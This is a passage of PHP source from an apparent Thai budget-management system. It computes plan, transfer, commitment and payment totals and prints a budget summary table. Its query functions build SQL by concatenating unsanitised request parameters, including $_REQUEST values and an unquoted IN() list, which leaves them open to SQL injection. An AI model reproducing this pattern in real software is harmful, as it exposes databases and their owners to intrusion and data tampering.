		$datas = array_merge($title,$datas);
		echo clssHTML::selectList( $datas, $tag_name, $tag_attribs,'value','text', $selected );
	}
	/* END */			
		
	//========================== Start ตารางสรุปงบประมาณ ===========================
	function getBudgetRemainForm($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$DocCode=""){
		$SourceType		= ($SourceType)?$SourceType:$_REQUEST["SourceType"];
		$SourceExId			= ($SourceExId)?$SourceExId:$_REQUEST["SourceExId"];
		$PrjCode				= ($PrjCode)?$PrjCode:$_REQUEST["PrjCode"];
		$PrjActCode			= ($PrjActCode)?$PrjActCode:$_REQUEST["PrjActCode"];
		$CostItemCode		= ($CostItemCode)?$CostItemCode:$_REQUEST["CostItemCode"];
		$DocCode			= ($DocCode)?$DocCode:$_REQUEST["DocCode"];
		
/*		echo "<br/>SourceType= ".$SourceType;
		echo "<br/>SourceExId=".$SourceExId;
		echo "<br/>PrjCode=".$PrjCode;
		echo "<br/>PrjActCode=".$PrjActCode;
		echo "<br/>CostItemCode=".$CostItemCode;
		echo "<br/>DocCode".$DocCode;*/
				
		// (1)  งบตามแผน
		switch($SourceType){
			case "Internal":
				$SumPrj 		= $this->getSumPlanBudget('tblbudget_project_activity_cost_internal','tblbudget_project_activity_cost_internal_month','Budget','CostIntId',$BgtYear,0,0,$PItemCode,$PrjCode,0,0,0,0);
				$SumAct 		= $this->getSumPlanBudget('tblbudget_project_activity_cost_internal','tblbudget_project_activity_cost_internal_month','Budget','CostIntId',$BgtYear,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,0);
			break;
			case "External":
				$SumPrj 		= $this->getSumPlanBudget('tblbudget_project_activity_cost_external','tblbudget_project_activity_cost_external_month','Budget','CostExtId',$BgtYear,0,0,$PItemCode,$PrjCode,0,0,0,$SourceExId);
				$SumAct 		= $this->getSumPlanBudget('tblbudget_project_activity_cost_external','tblbudget_project_activity_cost_external_month','Budget','CostExtId',$BgtYear,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,$SourceExId);
			break;
			default :
				$PlanPrjIn 	= $this->getSumPlanBudget('tblbudget_project_activity_cost_internal','tblbudget_project_activity_cost_internal_month','Budget','CostIntId',$BgtYear,0,0,$PItemCode,$PrjCode,0,0,0,0);
				$PlanActIn 	= $this->getSumPlanBudget('tblbudget_project_activity_cost_internal','tblbudget_project_activity_cost_internal_month','Budget','CostIntId',$BgtYear,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,0);
				$PlanPrjEx 	= $this->getSumPlanBudget('tblbudget_project_activity_cost_external','tblbudget_project_activity_cost_external_month','Budget','CostExtId',$BgtYear,0,0,$PItemCode,$PrjCode,0,0,0,$SourceExId);
				$PlanActEx 	= $this->getSumPlanBudget('tblbudget_project_activity_cost_external','tblbudget_project_activity_cost_external_month','Budget','CostExtId',$BgtYear,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,$SourceExId);
				$SumPrj 		= $PlanPrjIn + $PlanPrjEx;
				$SumAct 		= $PlanActIn + $PlanActEx;
			break;
		  }				
		// (2) งบรอโอนออก
		$TferWaitPrj 		= $this->getTferOut($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,"N");
		$TferWaitAct 		= $this->getTferOut($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,"N");	
		
		// (3) งบโอนออก
		$TferOutPrj 			= $this->getTferOut($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,"Y");
		$TferOutAct 		= $this->getTferOut($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,"Y");	
		
		// (4) งบรับโอน
		$TferInPrj 			= $this->getTferIn($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,"Y");
		$TferInAct 			= $this->getTferIn($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,"Y");
		
		// (5) งบแผนรวมโอน => 1-2-3+4
		$SumTferPrj 		= $SumPrj - $TferWaitPrj - $TferOutPrj + $TferInPrj;
		$SumTferAct 		= $SumAct - $TferWaitAct - $TferOutAct + $TferInAct;		
		
		// (6) งบรอหลักการ
		$BookWaitPrj 		= $this->getHoldFormalWait($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,$FormCode,'N','N',0);
		$BookWaitAct 		= $this->getHoldFormalWait($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,$FormCode,'N','N',0);;
		
		// (7) งบหลักการ
		$BookPrj 				= $this->getHoldFormal($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,$FormCode);
		$BookAct 			= $this->getHoldFormal($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,$FormCode);

		// (8) งบประมาณผูกพัน
		$ChainPrj 			= $this->getChain($BgtYear,$SourceType,$SourceExId,0,0,0,$PrjCode);
		$ChainAct 			= $this->getChain($BgtYear,$SourceType,$SourceExId,0,0,0,$PrjCode,$PrjActCode);
		//$ChainCost		= $this->getChain($BgtYear,$SourceType,$SourceExId,0,0,0,$PrjCode,$PrjActCode,0,$CostItemCode);

		// (9) งบรอตัดจ่าย
		//	function getPay($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus="",$FormCode=0){
		$PayWaitPrj 		= $this->getPay($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,"N",$FormCode);
		$PayWaitAct 		= $this->getPay($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,"N",$FormCode);
		
		// (10) งบตัดจ่าย
		$PayPrj 				= $this->getPay($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,0,0,0,"Y",$FormCode);
		$PayAct 				= $this->getPay($BgtYear,$SourceType,$SourceExId,0,0,$PItemCode,$PrjCode,$PrjActCode,0,0,"Y",$FormCode);
		
		// (11) งบรวมจ่ายจริง => 8+9+10
		$SumPayPrj 		= $ChainPrj + $PayWaitPrj + $PayPrj;
		$SumPayAct 		= $ChainAct + $PayWaitAct + $PayAct;

		// (12) คงเหลือ (ไม่รวมหลักการ) => 5-11
		 $RemainPrj 		=  $SumTferPrj - $SumPayPrj;
		 $RemainAct 		=	$SumTferAct - $SumPayAct;  
		
		// (13) คงเหลือ (รวมหลักการ) => 5-6-7-11
		 $RemainPlusPrj 		=  $SumTferPrj - $BookWaitPrj - $BookPrj - $SumPayPrj;
		 $RemainPlusAct 		=	$SumTferAct - $BookWaitAct - $BookAct - $SumPayAct;  
		
		echo '
				<table  width="100%" border="0" cellspacing="1" cellpadding="0" class="tbl-history" style="border-top:0px;">
					  <tr>
						<th style="width:25%;">&nbsp;</th>
						<th style="width:20%; text-align:center;">งบโครงการ</th>
						<th style="width:20%; text-align:center;">งบกิจกรรม</th>
						<th style="width:5%;">&nbsp;</th>
						<th style="width:30%;">หมายเหตุ</th>
					  </tr>
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบตามแผน <span class="hint">[1]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($SumPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($SumAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบรอโอนออก <span class="hint">[2]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferWaitPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferWaitAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบโอนออก <span class="hint">[3]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferOutPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferOutAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>						  
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบรับโอน <span class="hint">[4]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferInPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($TferInAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberTotal">งบแผนรวมโอน <span class="hint">[5]</span></td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($SumTferPrj,2).'</td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($SumTferAct,2).'</td>
						<td class="txtNumberTotal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">ยอดรวม = [1] - [2] - [3] + [4]</span></td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบรอหลักการ <span class="hint">[6]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($BookWaitPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($BookWaitAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบหลักการ <span class="hint">[7]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($BookPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($BookAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบผูกพัน <span class="hint">[8]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($ChainPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($ChainAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal">&nbsp;</td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบรอตัดจ่าย <span class="hint">[9]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($PayWaitPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($PayWaitAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">รวมยอดเบิกจ่ายที่ไม่ได้ผูกพันไว้ก่อนด้วย</span></td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberNormal">งบตัดจ่าย <span class="hint">[10]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($PayPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($PayAct,2).'</td>
						<td class="txtNumberNormal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">รวมยอดเบิกจ่ายที่ไม่ได้ผูกพันไว้ก่อนด้วย</span></td>
					  </tr>				  
					  <tr>
						<td style="text-align:right;" class="txtNumberTotal">งบรวมจ่ายจริง <span class="hint">[11]</span></td>
						<td style="text-align:right;" class="txtNumber">'.number_format($SumPayPrj,2).'</td>
						<td style="text-align:right;" class="txtNumber">'.number_format($SumPayAct,2).'</td>
						<td class="txtNumberTotal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">ยอดรวม = [8] + [9] + [10]</span></td>
					  </tr>	
					  <tr>
						<td style="text-align:right;" class="txtNumberTotal">คงเหลือ (ไม่รวมหลักการ)</td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($RemainPrj,2).'</td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($RemainAct,2).'</td>
						<td class="txtNumberTotal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">ยอดรวม = [5] - [11]</span></td>
					  </tr>		
					  <tr>
						<td style="text-align:right;" class="txtNumberTotal">คงเหลือ (รวมหลักการ)</td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($RemainPlusPrj,2).'</td>
						<td style="text-align:right;" class="txtNumberBold">'.number_format($RemainPlusAct,2).'</td>
						<td class="txtNumberTotal">&nbsp;บาท</td>
						<td class="txtNumberNormal"><span class="hint">ยอดรวม = [5] - [6] - [7] - [11]</span></td>
					  </tr>						  				  
					</table>
					<div>
						<input type="hidden" name="RemainPrj" id="RemainPrj" value="'.$RemainPlusPrj.'" style="width:40%;" />
						<input type="hidden" name="RemainAct" id="RemainAct" value="'.$RemainPlusAct.'" style="width:40%;" />
					</div>
			';

	}
	
	/* 
	START
	Function Name			:	getSumPlanBudget
	Description				: 	คำนวณยอดรวมงบตามแผน (งบแผ่นดิน หรือ งบนอก)
	Parameter				: 	
		@TblCost				= 	ชื่อตารางตัวคูณ 4 ช่อง
		@TblMonth			= 	ชื่อตารางแจงรายเดือน
		@Field					= 	ชื่อ Field งบประมาณที่จะคำนวณยอดรวม
		@BgtYear			= 	ปีงบประมาณ
		@OrgOwner			= 	หน่วยงานเจ้าของโครงการ
		@OrgOperate		=	หน่วยงานผู้ปฏิบัติงานของกิจกรรม
		@PItemCode		=	แผนงาน
		@PrjCode			=	โครงการ 
		@PrjActCode		=	กิจกรรม
		@CostTypeId		=	หมวดค่าใช้จ่าย
		@CostItemCode	=	รายการค่าใช้จ่าย 
	Return Value 			: Single(loadResult) ยอดรวมงบตามแผนที่ตั้งไว้
	*/	
	function getSumPlanBudget($TblCost='',$TblMonth='',$Field='',$CostField='',$BgtYear=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$SourceExId=0){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t5.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{	$where[]	= "t5.OrganizeCode ='".$OrgOwner."'"; 		}
		if($OrgOperate)	{	$where[]	= "t3.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode)		{	$where[]	= "t5.PItemCode ='".$PItemCode."'"; 			}
		if($PrjCode)			{	$where[]	= "t5.PrjCode ='".$PrjCode."'"; 						}
		if($PrjActCode)		{	$where[]	= "t3.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId)	{	$where[]	= "t7.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){	$where[]	= "t2.CostItemCode ='".$CostItemCode."'"; 	}
		if($SourceExId)	{	$where[]	= "t2.SourceExId ='".$SourceExId."'"; 			}
		
		$where[] = "t4.ActiveStatus='Y'";
		$where[] = "t4.SCTypeId >='2'";	//ต้อง >= 2 หรือไม่
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.".$Field.")as total "
				."\n from ".$TblMonth." as t1 "
				."\n left join ".$TblCost." as t2 on t2.".$CostField."=t1.".$CostField." "
				."\n left join tblbudget_project_activity as t3 on t3.PrjActId=t2.PrjActId "
				."\n left join tblbudget_project_detail as t4 on t4.PrjDetailId=t3.PrjDetailId "
				."\n left join tblbudget_project as t5 on t5.PrjCode=t4.PrjCode "
				."\n left join tblbudget_init_cost_item as t6 on t6.CostItemCode=t2.CostItemCode "
				."\n left join tblbudget_init_cost_type as t7 on t7.CostTypeId=t6.CostTypeId "
				."\n".$where_r
				;
				
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/	
	
	/* 
	START
	Function Name		: getChain
	Description			: คำนวณยอดรวมงบผูกพันทั้งที่อนุมัติแล้วและยังไม่อนุมัติ
	Parameter			:
		@BgtYear			= ปีงบประมาณ
		@SourceType		= แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ)
		@SourceExId		= ประเภทแหล่งเงินนอกงบ
		@OrgOwner			= หน่วยงานเจ้าของโครงการ
		@OrgOperate		= หน่วยงานผู้ปฏิบัติงานของกิจกรรม 
		@PItemCode		= แผนงาน
		@PrjCode			= โครงการ
		@PrjActCode		= กิจกรรม
		@CostTypeId		= หมวดค่าใช้จ่าย 
		@CostItemCode	= รายการค่าใช้จ่าย	 
		@FormCode			= รหัสแบบฟอร์ม
	Return Value 		: Single(loadResult) ผลรวมยอดผูกพันงบ
	*/	
	function getChain($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=0){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 		}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 			}
		if($PrjCode)			{	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 						}
		if($PrjActCode)		{	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId)	{	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){	$where[]	= "t1.CostItemCode ='".$CostItemCode."'"; 	}
		if($SourceType)	{	$where[] = "t1.SourceType ='".$SourceType."'";			}
		if($SourceExId)	{	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 			}
		if($FormCode)		{	$where[]	= "t1.FormCode in(".$FormCode.")"; 			}
		
		$where[] = "t3.ActiveStatus='Y'";		//แผนปฏิบัติงานขั้นตอนปัจจุบัน
		$where[] = "t3.SCTypeId >= '2'";		//อยู่ในขั้นตอนการจัดทำแผนปฏิบัติงาน
		$where[] = "t1.CloseStatus='N'";		//ยังไม่ปิดผูกพัน
		$where[] = "t1.CancelStatus='N'";		//ไม่มีการยกเลิกการผูกพัน
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.SumCost - t1.SumPay)as total "
				."\n from tblbudget_bg_chain as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCode "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCode "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/	
	
	/* 
	START
	Function Name	: getTferOut
	Description			: คำนวณยอดโอนออก (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย , สถานะ Commit
	Return Value 		: ผลรวมยอดโอนออก
	*/	
	function getTferOut($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus=""){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{ 	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 				}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";				}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 					}
		if($PrjCode)			{ 	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 								}
		if($PrjActCode)		{ 	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 					}
		if($CostTypeId)	{ 	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 					}
		if($CostItemCode){  	$where[]	= "t1.CostItemCodeFrom ='".$CostItemCode."'"; 	}
		if($CommitStatus){  	$where[]	= "t1.CommitStatus ='".$CommitStatus."'"; 			}
		if($SourceType)	{	$where[] 	= "t1.SourceType ='".$SourceType."'";				}
		if($SourceExId)	{  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 					}
		
		$where[] = "t3.ActiveStatus='Y'";
		$where[] = "t3.SCTypeId >= '2'";
		$where[] = "t1.CancelStatus = 'N'";
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.Budget)as total "
				."\n from tblbudget_bg_transfer as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCodeFrom "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCodeFrom "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/	
	
	/* START
	Function Name	: getTferIn
	Description			: คำนวณยอดรับโอน (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย , สถานะ Commit
	Return Value 		: ผลรวมยอดรับโอน
	*/	
	function getTferIn($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus=""){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{ 	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 			}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";			}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 				}
		if($PrjCode)			{ 	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 							}
		if($PrjActCode)		{ 	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 				}
		if($CostTypeId)	{ 	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 				}
		if($CostItemCode){  	$where[]	= "t1.CostItemCodeTo ='".$CostItemCode."'"; 	}
		if($CommitStatus){  	$where[]	= "t1.CommitStatus ='".$CommitStatus."'"; 		}
		if($SourceType)	{	$where[] 	= "t1.SourceType ='".$SourceType."'";			}
		if($SourceExId)	{  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 				}
		
		$where[] = "t3.ActiveStatus='Y'";
		$where[] = "t3.SCTypeId >= '2'";
		$where[] = "t1.CancelStatus = 'N'";
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.Budget)as total "
				."\n from tblbudget_bg_transfer as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCodeTo "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCodeTo "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}	/*END*/
	

	
	/* 
	START
	Function Name	: getBooking
	Description			: คำนวณงบจองใช้เงิน (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ผลรวมยอดจองขอใช้เงิน
	*/	
	function getBooking($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=0,$CancelStatus="",$CloseStatus="",$DocCode=""){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{ 	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 		}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 			}
		if($PrjCode)			{ 	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 						}
		if($PrjActCode)		{ 	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId)	{ 	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){   $where[]	= "t1.CostItemCode ='".$CostItemCode."'"; 	}
		if($FormCode)		{  	$where[]	= "t1.FormCode in(".$FormCode.")"; 			}
		if($SourceType)	{	$where[] = "t1.SourceType ='".$SourceType."'";			}
		if($SourceExId)	{  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 			}
		if($CancelStatus)	{  	$where[]	= "t1.CancelStatus ='".$CancelStatus."'"; 	}
		if($CloseStatus)	{  	$where[]	= "t1.CloseStatus ='".$CloseStatus."'"; 		}
		if($DocCode)		{  	$where[]	= "t1.DocCode <> '".$DocCode."'"; 				}	
		
		$where[] = "t3.ActiveStatus='Y'";
		$where[] = "t3.SCTypeId >= '2'";
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.SumCost)as total "
				."\n from tblbudget_bg_book as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCode "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCode "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
				
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/
	
	/* START
	Function Name	: getHoldFormalWait
	Description			: คำนวณยอดรวมงบรอหลักการ (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ผลรวมยอดรอหลักการ
	*/	
	function getHoldFormalWait($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=0,$CancelStatus="",$CloseStatus="",$DocCode=""){
		$FormCode = "'FF008','FF011','FP001','FP002','FC001'";
		$datas = $this->getBooking($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode,"N","N");
		return $datas;
	}
	/*END*/	
	
	/* START
	Function Name	: getHold
	Description			: คำนวณยอดรวมงบกันเงิน (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ผลรวมยอดกันเงิน
	*/	
	function getHold($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=0){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{ 	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 		}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 			}
		if($PrjCode)			{ 	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 						}
